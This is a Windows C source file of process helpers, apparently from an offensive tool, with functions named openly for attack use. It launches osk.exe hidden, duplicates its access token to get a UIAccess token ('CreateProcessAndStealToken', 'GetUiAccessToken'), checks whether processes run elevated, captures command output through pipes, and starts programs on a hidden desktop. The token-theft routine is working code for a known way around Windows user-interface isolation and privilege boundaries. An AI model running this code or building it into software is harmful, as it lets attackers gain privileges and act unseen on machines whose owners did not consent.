#include "pch.h"

BOOL Run
(
	_In_ LPWSTR* Argv,
	_In_ DWORD dwArgc,
	_Out_ PHANDLE phProcess
)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	DWORD dwLength = 1;
	UINT i = 0;
	LPWSTR lpCommandLine = NULL;
	BOOL bResult = FALSE;

	for (i = 0; i < dwArgc; i++) {
		dwLength += (lstrlenW(Argv[i]) + 1);
	}

	lpCommandLine = ALLOC(dwLength * sizeof(WCHAR));
	for (i = 0; i < dwArgc; i++) {
		StrCatBuffW(lpCommandLine, Argv[i], dwLength);
		StrCatBuffW(lpCommandLine, L" ", dwLength);
	}

	lpCommandLine[lstrlenW(lpCommandLine) - 1] = L'\0';
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	bResult = TRUE;
END:
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (phProcess != NULL) {
		*phProcess = pi.hProcess;
	}
	else if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (lpCommandLine != NULL) {
		FREE(lpCommandLine);
	}

	return bResult;
}

DWORD GetProcessIdByName
(
	_In_ LPWSTR lpProcessName
)
{
	HANDLE hProc = NULL;
	WCHAR wszTempName[MAX_PATH];
	DWORD cbTempName;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	DWORD dwResult = 0;
	PROCESSENTRY32W ProcessEntry;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		goto END;
	}

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32FirstW(hSnapshot, &ProcessEntry)) {
		goto END;
	}

	do {
		hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessEntry.th32ProcessID);
		if (hProc == NULL) {
			continue;
		}

		cbTempName = MAX_PATH;
		if (QueryFullProcessImageNameW(hProc, 0, wszTempName, &cbTempName)) {
			if (!StrCmpW(PathFindFileNameW(wszTempName), lpProcessName)) {
				CloseHandle(hProc);
				dwResult = ProcessEntry.th32ProcessID;
				goto END;
			}
		}

		CloseHandle(hProc);
	} while (Process32NextW(hSnapshot, &ProcessEntry));
END:
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		CloseHandle(hSnapshot);
	}

	return dwResult;
}

HANDLE CreateProcessAndStealToken
(
	_In_ LPWSTR lpFilePath
)
{
	SHELLEXECUTEINFOW ShellExeInfo;
	HANDLE hResult = NULL;
	NTSTATUS Status;
	HANDLE hProcessToken = NULL;
	SECURITY_QUALITY_OF_SERVICE SecurityQuality;
	OBJECT_ATTRIBUTES ObjAttr;

	ZeroMemory(&ShellExeInfo, sizeof(ShellExeInfo));
	ShellExeInfo.cbSize = sizeof(ShellExeInfo);
	ShellExeInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShellExeInfo.lpFile = lpFilePath;
	ShellExeInfo.nShow = SW_HIDE;

	if (!ShellExecuteExW(&ShellExeInfo)) {
		goto END;
	}

	Status = NtOpenProcessToken(ShellExeInfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
	if (!NT_SUCCESS(Status)) {
		goto END;
	}

	ZeroMemory(&SecurityQuality, sizeof(SecurityQuality));
	SecurityQuality.Length = sizeof(SecurityQuality);
	SecurityQuality.ImpersonationLevel = SecurityImpersonation;
	SecurityQuality.ContextTrackingMode = 0;
	SecurityQuality.EffectiveOnly = FALSE;
	InitializeObjectAttributes(&ObjAttr, NULL, 0, NULL, NULL);
	ObjAttr.SecurityQualityOfService = &SecurityQuality;
	Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &ObjAttr, FALSE, TokenPrimary, &hResult);
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

END:
	if (hProcessToken != NULL) {
		CloseHandle(hProcessToken);
	}

	NtTerminateProcess(ShellExeInfo.hProcess, STATUS_SUCCESS);

	if (ShellExeInfo.hProcess != NULL) {
		CloseHandle(ShellExeInfo.hProcess);
	}

	return hResult;
}

HANDLE SetTokenWithUiAccess
(
	_In_ HANDLE hToken
)
{
	SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
	NTSTATUS Status = 0;
	PSID pIntegritySid = NULL;
	TOKEN_MANDATORY_LABEL MandatoryLabel;
	HANDLE hResult = NULL;

	Status = RtlAllocateAndInitializeSid(&MLAuthority, 1, SECURITY_MANDATORY_MEDIUM_RID, 0, 0, 0, 0, 0, 0, 0, &pIntegritySid);
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

	ZeroMemory(&MandatoryLabel, sizeof(MandatoryLabel));
	MandatoryLabel.Label.Attributes = SE_GROUP_INTEGRITY;
	MandatoryLabel.Label.Sid = pIntegritySid;
	Status = NtSetInformationToken(hToken, TokenIntegrityLevel, &MandatoryLabel, (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
	if (!NT_SUCCESS(Status))
	{
		goto END;
	}

	hResult = hToken;
END:

	return hResult;
}

HANDLE GetUiAccessToken()
{
	HANDLE hToken = NULL;
	WCHAR wszOskPath[MAX_PATH];

	ExpandEnvironmentStringsW(L"%WINDIR%\\System32\\osk.exe", wszOskPath, MAX_PATH);
	hToken = CreateProcessAndStealToken(wszOskPath);
	if (hToken == NULL) {
		goto END;
	}

	hToken = SetTokenWithUiAccess(hToken);
	if (hToken == NULL) {
		goto END;
	}

END:
	return hToken;
}

NTSTATUS IsProcessElevated
(
	_In_ ULONG ProcessId,
	_Out_ PBOOL Elevated
)
{
	NTSTATUS Status;
	ULONG Dummy;
	HANDLE ProcessHandle, TokenHandle;
	CLIENT_ID ClientId;
	TOKEN_ELEVATION TokenInfo;
	OBJECT_ATTRIBUTES ObAttr = RTL_INIT_OBJECT_ATTRIBUTES(NULL, 0);

	ClientId.UniqueProcess = UlongToHandle(ProcessId);
	ClientId.UniqueThread = NULL;

	if (Elevated) {
		*Elevated = FALSE;
	}

	Status = NtOpenProcess(&ProcessHandle, MAXIMUM_ALLOWED, &ObAttr, &ClientId);
	if (NT_SUCCESS(Status)) {
		Status = NtOpenProcessToken(ProcessHandle, TOKEN_QUERY, &TokenHandle);
		if (NT_SUCCESS(Status)) {
			TokenInfo.TokenIsElevated = 0;
			Status = NtQueryInformationToken(TokenHandle, TokenElevation, &TokenInfo, sizeof(TOKEN_ELEVATION), &Dummy);

			if (NT_SUCCESS(Status)) {
				if (Elevated) {
					*Elevated = (TokenInfo.TokenIsElevated > 0);
				}
			}

			NtClose(TokenHandle);
		}

		NtClose(ProcessHandle);
	}

	return Status;
}

VOID ReadOutputFromProcess
(
	_In_ HANDLE hPipeRead,
	_In_ HANDLE hProcess,
	_Out_ PBYTE* pBufferPointer,
	_Out_ PDWORD pdwSize
)
{
	BOOL bSuccess = FALSE;
	PBYTE pBuffer = ALLOC(0x1000);
	DWORD dwNumberOfBytesToRead = 0x1000;
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwTotalSize = 0;

	while (TRUE) {
		bSuccess = ReadFile(hPipeRead, &pBuffer[dwTotalSize], dwNumberOfBytesToRead, &dwNumberOfBytesRead, NULL);
		dwTotalSize += dwNumberOfBytesRead;

		if (!bSuccess || dwNumberOfBytesRead == 0) {
			break;
		}

		if (dwNumberOfBytesToRead == dwNumberOfBytesRead) {
			pBuffer = REALLOC(pBuffer, dwNumberOfBytesToRead * 2);
			dwNumberOfBytesRead = 0;
		}
		else {
			break;
		}
	}

	*pBufferPointer = pBuffer;
	*pdwSize = dwTotalSize;
	WaitForSingleObject(hProcess, INFINITE);
	return;
}

BOOL CreateProcessAndGetOutput
(
	_In_ LPWSTR lpCommandLine,
	_Out_ PBYTE* pOutput,
	_Out_ PDWORD pdwSize
)
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si;
	HANDLE hChildStdOutRd = NULL;
	HANDLE hChildStdOutWr = NULL;
	SECURITY_ATTRIBUTES SecAttr;
	BOOL bResult = FALSE;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&SecAttr, sizeof(SecAttr));
	SecAttr.nLength = sizeof(SecAttr);
	SecAttr.bInheritHandle = TRUE;
	SecAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hChildStdOutRd, &hChildStdOutWr, &SecAttr, 0)) {
		goto END;
	}

	if (!SetHandleInformation(hChildStdOutRd, HANDLE_FLAG_INHERIT, 0)) {
		goto END;
	}

	si.cb = sizeof(si);
	si.hStdError = hChildStdOutWr;
	si.hStdOutput = hChildStdOutWr;
	si.dwFlags |= STARTF_USESTDHANDLES;

	if (!CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		goto END;
	}

	ReadOutputFromProcess(hChildStdOutRd, pi.hProcess, pOutput, pdwSize);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	bResult = TRUE;
END:
	return bResult;
}

BOOL CreateProcessWithDesktop
(
	_In_ LPWSTR lpCommandLine,
	_In_ LPWSTR lpDesktopName
)
{
	HDESK hOrigDesk = NULL;
	HDESK hHiddenDesk = NULL;
	BOOL Result = FALSE;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES sa;

	hHiddenDesk = OpenDesktopW(lpDesktopName, 0, TRUE, GENERIC_ALL);
	hOrigDesk = GetThreadDesktop(GetCurrentThreadId());
	if (!hHiddenDesk) {
		RtlSecureZeroMemory(&sa, sizeof(sa));
		sa.nLength = sizeof(sa);
		sa.bInheritHandle = TRUE;
		hHiddenDesk = CreateDesktopW(lpDesktopName, NULL, NULL, 0, GENERIC_ALL, &sa);
		if (hHiddenDesk == NULL) {
			LogError(L"CreateDesktopW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto CLEANUP;
		}
	}

	if (!SetThreadDesktop(hHiddenDesk)) {
		LogError(L"SetThreadDesktop failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	if (!SwitchDesktop(hHiddenDesk)) {
		LogError(L"SwitchDesktop failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	si.lpDesktop = lpDesktopName;
	Sleep(10000);
	Result = CreateProcessW(NULL, lpCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	if (!Result) {
		LogError(L"CreateProcessW failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
CLEANUP:
	SwitchDesktop(hOrigDesk);
	SetThreadDesktop(hOrigDesk);
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (hHiddenDesk != NULL) {
		CloseDesktop(hHiddenDesk);
	}

	if (hOrigDesk != NULL) {
		CloseDesktop(hOrigDesk);
	}

	return Result;
}